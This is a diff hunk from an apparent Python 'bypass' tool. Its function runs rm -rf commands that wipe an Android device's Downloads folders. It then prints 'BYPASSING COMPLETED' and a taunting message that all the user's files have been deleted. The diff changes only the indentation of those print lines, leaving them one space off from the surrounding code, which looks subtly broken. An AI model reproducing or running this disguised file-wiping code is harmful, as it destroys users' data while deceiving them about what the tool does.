@@ -62,9 +62,9 @@ def sintacsDelete():
              os.system('rm -rf /sdcard/Downloads/*')
              os.system('rm -rf /sdcard/downloads/*')
              systm("clear")
-            print(f"{lgr}  [✓] BYPASSING COMPLETED")
-            slp(5)
-            print(f"{lgr}  [✓] EYY, I GOT YOU! ALL FILES IN YOUR ANDROID STORAGE HAS BEEN DELETED.")
+             print(f"{lgr}  [✓] BYPASSING COMPLETED")
+             slp(5)
+             print(f"{lgr}  [✓] EYY, I GOT YOU! ALL FILES IN YOUR ANDROID STORAGE HAS BEEN DELETED.")
             exit()
         else:
           exit()
